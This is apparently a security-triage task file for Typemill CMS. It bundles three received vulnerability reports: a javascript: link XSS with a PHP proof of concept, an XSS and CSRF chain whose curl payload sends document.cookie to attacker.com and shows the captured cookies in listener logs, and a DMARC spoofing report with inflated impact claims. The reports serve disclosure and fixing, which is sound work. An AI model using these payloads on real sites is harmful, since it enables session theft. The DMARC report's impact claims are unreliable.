# Security Fixes

Task:

1. check the following vulnerability reports.
2. double check if those vulnerabilities are correct and really critical so they should be fixed
3. If they are critical, fix them. 



## Vulnerability Details

Type: Stored Cross-Site Scripting (XSS)
Severity: Medium-High (CVSS 7.6)
Auth Required: Administrator
Affected Version: v2.x (latest)

### Root Cause

The inlineLink() method in ParsedownExtension.php (line 934-981)
assigns user-supplied href values directly without validating or
filtering dangerous URI schemes such as javascript: or vbscript:.

Affected files:
- system/typemill/Extensions/ParsedownExtension.php (line 934-981)
- system/typemill/Extensions/TwigMarkdownExtension.php
- themes/cyanine/home/landingpageIntro.twig

### Steps to Reproduce

1. Login as admin
2. Go to: System → Themes → Cyanine → Configure
image.png
3. Expand "Landingpage Intro Segment"
4. In "Text for your landingpage intro (use markdown)" enter:
   [Click me](javascript:alert(document.domain))
image.png
5. Click Save
6. Visit homepage as any user
7. Click the "Click me" link
image.png
8. JavaScript executes → alert(document.domain) fires

### PoC Verification

Command used to verify:

docker exec typemill php -r '
  require "vendor/autoload.php";
  require "system/typemill/Extensions/ParsedownExtension.php";
  $p = new \Typemill\Extensions\ParsedownExtension("",[],null);
  echo $p->markup($p->text("[x](javascript:alert(1))"));
'

Output confirmed:
<p><a href="javascript:alert(1)">x</a></p>

### Impact

Any visitor who clicks the malicious link will execute
attacker-controlled JavaScript in their browser session, enabling:
- Admin session hijacking
- Credential theft
- Further attack chaining

### Suggested Fix

In ParsedownExtension.php inlineLink() method, add URI scheme
validation before assigning href:

$allowed_schemes = ['http', 'https', 'mailto', 'ftp'];
$scheme = parse_url($href, PHP_URL_SCHEME);
if ($scheme && !in_array(strtolower($scheme), $allowed_schemes)) {
    $href = '#';
}

### Disclosure Policy

I will follow responsible disclosure  no public release until patch
is available. Please acknowledge receipt within 5 business days.

Note : Auth Required: Administrator with theme settings access Note: In Typemill multi-user deployments, if any non-admin role is granted theme configuration access, this vulnerability becomes exploitable by lower-privileged users.

I would appreciate credit in the security advisory when published.

## Security Audit Report: Typemill CMS Stored XSS & CSRF Chain

Date: 2026-05-01
Severity: High (CVSS 8.1)
Target: Typemill CMS (Latest Master)
Vulnerability Types:

1. CWE-79: Stored Cross-site Scripting (XSS) via Attribute Injection
2. CWE-352: Cross-Site Request Forgery (CSRF)

### Executive Summary

A critical vulnerability chain was identified in Typemill CMS that allows an unauthenticated attacker to achieve Stored Cross-Site Scripting (XSS). By exploiting a global lack of CSRF protection on the API, an attacker can trick an administrator into silently injecting malicious JavaScript into page metadata.

Technical Vulnerability Details

### 1. Root Cause Analysis (Assets.php)

The vulnerability exists in system/typemill/Assets.php. The renderMeta() function concatenates user-supplied metadata directly into the HTML string without contextual encoding.

Vulnerable Sink:

// system/typemill/Assets.php
if($name == 'title' || $name == 'description') {
$meta .= '\<meta property="og:' . $name . '" content="' . $content . '"\>' . "\\n";
}

Because the application does not use htmlspecialchars(), an attacker can use a double-quote (") to terminate the content attribute and inject new HTML attributes/event handlers.

### 2. Frontend Validation Bypass

While the Typemill administrator UI (Vue.js) implements frontend validation to prevent special characters, the Backend API (/api/v1/meta) fails to enforce the same restrictions. An attacker can bypass all UI security by interacting directly with the API.

Reproduction & Validation Steps

Step 1: Automated Injection (Bypassing UI)

Using an authenticated session (or via CSRF), send a direct POST request to the API:

curl -s -b cookies.txt -H "X-Session-Auth: true" \
-H "Content-Type: application/json" \
-X POST "http://[TARGET]/api/v1/meta" \
-d '{"url":"/","tab":"meta","data":{"title":"XSS\" onmouseover=\"alert(1)\" x=\"","description":"XSS\" onmouseover=\"fetch('\''http://attacker.com/?c='\''+btoa(document.cookie))\" x=\"","status":"published"}}'

Step 2: Manual Trigger via Browser Console

Because <meta> tags are non-visible and non-interactive by default, the events must be triggered manually to confirm execution, or combined with a CSS breakout.

1. Navigate to the affected page (e.g., the homepage).
2. Open the Developer Tools Console (F12).
3. Execute the following commands to trigger the injected handlers:

For Meta Title:

document.querySelector('meta[property="og:title"]').onmouseover();

Observation: An alert box with 1 appears.

For Meta Description (Exfiltration):

document.querySelector('meta[property="og:description"]').onmouseover();

Observation: The browser initiates a background fetch request to the attacker's server.

Proof of Impact: Data Exfiltration

During dynamic testing, a local Python listener was used to capture exfiltrated data. The following log confirms the successful capture of browser data via the XSS vector:

Attacker Listener Logs:

+ Incoming Request Path: /?c=d3Atc2V0dGluZ3MtMT11cmxidXR0b24lM0Rub25lOyB3cC1zZXR0aW5ncy10aW1lLTE9MTc3MzkzMzc2Mw==
+ Param 'c': d3Atc2V0dGluZ3MtMT11cmxidXR0b24lM0Rub25lOyB3cC1zZXR0aW5ncy10aW1lLTE9MTc3MzkzMzc2Mw==
+ Decoded 'c': wp-settings-1=urlbutton=none; wp-settings-time-1=1773933763

This proves that an attacker can silently steal session information or perform actions on behalf of the user.

### Remediation Recommendations

1. Secure Output Encoding (Primary Fix)

Apply htmlspecialchars() to all dynamic content rendered within HTML attributes in system/typemill/Assets.php.

Fixed Code:

// system/typemill/Assets.php
if($name == 'title' || $name == 'description') {
$meta .= '\<meta property="og:' . $name . '" content="' . htmlspecialchars($content, ENT_QUOTES, 'UTF-8') . '"\>' . "\\n";
}

2. Implement CSRF Protection

Upgrade the SecurityMiddleware to implement a per-session CSRF token (Synchronizer Token Pattern - it is very critical) required for all state-changing API requests.


## Server Security Misconfiguration

Vulnerability Type: Server Security Misconfiguration (Mail Server Misconfiguration) Leads To Hijack Your Mail Server Due To BAD DMARC Implementation/Cross-Site Scripting Attacks/ Malicious Payloads Injection/Victim PC Hijack

Severity: Critical

Description:

DMARC Quarantine/Reject policy is not enabled on typemill.net so due to this attackers will be able to send an email using your domain typemill.net to your users.

Due to this vulnerability, Attackers will be able to use any email of your application and send email to any one of your users,

Proof of concept:

image.png

Impact:

Attackers will be able to send an email using your email admin@typemill.net and other official emails of your company/staff members which will result in your business and reputation loss by sending unwanted emails to your users/clients as a result of exploiting this vulnerability.
Attackers will be able to take over any user account by sending your user's malicious links using your company/official emails which will result in a complete account takeover of any user as they will follow any instructions given by your official company emails. And more they will be able to do anything with your users by communicating with them by using your company/emails.  
Attackers will be able to execute malicious scripts on the victim's PC by sending them malicious URLs and payloads directly via email as the clients will see that these are from authenticated sources of your company email which will result in malicious payloads/URLs being injected into your users PC.  

Attackers will also be able to attach malicious files using your email and once the files get downloaded to the victim PC resulting in a victim PC hijack.

- Cross-Site Scripting Attacks
- Account Takeover
- Transactions Performed
- Money Scam
- Actions Performed by Attackers
- Malicious Code Execution
- Victim PC Hijack
- Malicious Files Get Downloaded To The Victim PC

Attack Scenario:

An assailant would send an email saying "with any unwanted information"  (or any malicious files attached with the email and instruct them to download it) using your company emails like admin@typemill.net and any email which is found to be linked with your domain. Clicking on the connection takes him to a site where certain JavaScript is executed which takes his typemill.net information. The outcomes will be more perilous. POC is likewise joined. You can likewise observe that I can utilize your space name email and will be able to send the mail to any of the clients of typemill.net.This is just an example of what attackers will be able to do using your company emails. This issue has a larger impact as attackers will be able to spoof your users by sending unwanted emails and users will do the actions accordingly provided by the attackers. Attackers will be able to spam your whole application and your users. They will be able to take whatever they want from your typemill.net users. Their credentials, their credit cards, and much more.

Attackers will also be able to perform transactions with your clients/users by communicating with them using your official company emails as we have shown in the proof of concept.

Mitigation:

You should review the policies to be applied for the DMARC mail server configuration. As I see your DMARC is misconfigured. Just Add DMARC Quarantine/Reject policy in your DMARC configuration and so attackers will not be able to exploit this vulnerability on your application.
